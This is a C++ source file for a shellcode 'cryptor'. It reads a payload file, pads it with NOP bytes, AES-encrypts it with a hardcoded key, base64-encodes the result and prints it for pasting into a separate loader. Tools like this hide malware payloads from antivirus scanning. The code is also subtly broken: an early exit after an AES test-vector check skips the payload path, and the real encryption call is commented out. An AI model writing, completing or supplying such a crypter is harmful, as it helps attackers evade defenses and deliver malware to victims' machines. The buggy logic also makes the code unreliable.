#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <iterator>
#include "aes.hpp"
#include "base64.h"

#define AES256 1

std::vector<uint8_t> readFile(const char* filename)
{
    // open the file:
    std::ifstream file(filename, std::ios::binary);

    // Stop eating new lines in binary mode!!!
    file.unsetf(std::ios::skipws);

    // get its size:
    std::streampos fileSize;

    file.seekg(0, std::ios::end);
    fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // reserve capacity
    std::vector<BYTE> vec;
    vec.reserve(fileSize);

    // read the data:
    vec.insert(vec.begin(), std::istream_iterator<BYTE>(file), std::istream_iterator<BYTE>());

    return vec;
}

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("Usage:\tcryptor.exe <payload.bin>\n");
        printf("Example\tcryptor.exe C:\\Users\\admin\\shellcode.bin\n");
        exit(1);
    }

    std::vector<uint8_t> plaintext, ciphertext;

    // AES Objects
    struct AES_ctx e_ctx;
    
    uint8_t key[] = { 0x60,0x3d,0xeb,0x10,0x15,0xca,0x71,0xbe,0x2b,0x73,0xae,0xf0,0x85,0x7d,0x77,0x81,0x1f,0x35,0x2c,0x07,0x3b,0x61,0x08,0xd7,0x2d,0x98,0x10,0xa3,0x09,0x14,0xdf,0xf4 };
    uint8_t iv[] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f };
    uint8_t in[] = { 0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a,
                    0xae, 0x2d, 0x8a, 0x57, 0x1e, 0x03, 0xac, 0x9c, 0x9e, 0xb7, 0x6f, 0xac, 0x45, 0xaf, 0x8e, 0x51,
                    0x30, 0xc8, 0x1c, 0x46, 0xa3, 0x5c, 0xe4, 0x11, 0xe5, 0xfb, 0xc1, 0x19, 0x1a, 0x0a, 0x52, 0xef,
                    0xf6, 0x9f, 0x24, 0x45, 0xdf, 0x4f, 0x9b, 0x17, 0xad, 0x2b, 0x41, 0x7b, 0xe6, 0x6c, 0x37, 0x10 };

    uint8_t out[] = { 0xf5, 0x8c, 0x4c, 0x04, 0xd6, 0xe5, 0xf1, 0xba, 0x77, 0x9e, 0xab, 0xfb, 0x5f, 0x7b, 0xfb, 0xd6,
                    0x9c, 0xfc, 0x4e, 0x96, 0x7e, 0xdb, 0x80, 0x8d, 0x67, 0x9f, 0x77, 0x7b, 0xc6, 0x70, 0x2c, 0x7d,
                    0x39, 0xf2, 0x33, 0x69, 0xa9, 0xd9, 0xba, 0xcf, 0xa5, 0x30, 0xe2, 0x63, 0x04, 0x23, 0x14, 0x61,
                    0xb2, 0xeb, 0x05, 0xe2, 0xc3, 0x9b, 0xe9, 0xfc, 0xda, 0x6c, 0x19, 0x07, 0x8c, 0x6a, 0x9d, 0x1b };

    AES_init_ctx_iv(&e_ctx, key, iv);
    AES_CBC_encrypt_buffer(&e_ctx, in, 64);

    for (int i = 0; i < sizeof(in); i++)
    {
        printf("%x", in[i]);
    }

    exit(0);

    plaintext.clear();
    plaintext = readFile(argv[1]);
    
    // Padd the plaintext if needed with NOPS
    while ((plaintext.size() % 16) != 0)
    {
        plaintext.push_back(0x90);
    }


    // ENCRYPT
    ciphertext.clear();
    AES_init_ctx_iv(&e_ctx, key, iv);
    //AES_CBC_encrypt_buffer(&e_ctx, plaintext.data(), plaintext.size());             // Encrypt the plaintext data
    AES_CBC_encrypt_buffer(&e_ctx, in, 64);
    std::copy(plaintext.begin(), plaintext.end(), std::back_inserter(ciphertext));  // Load the ciphertext into the ciphertext vector.


    // ENCODE
    base64 b64 = base64();
    std::string encoded = b64.base64_encode(ciphertext.data(), ciphertext.size());
    std::cout << "[i] Replace shellcode string in loader with one below:\n" << std::endl;
    printf("shellcode = \"%s\";", encoded.c_str());

}

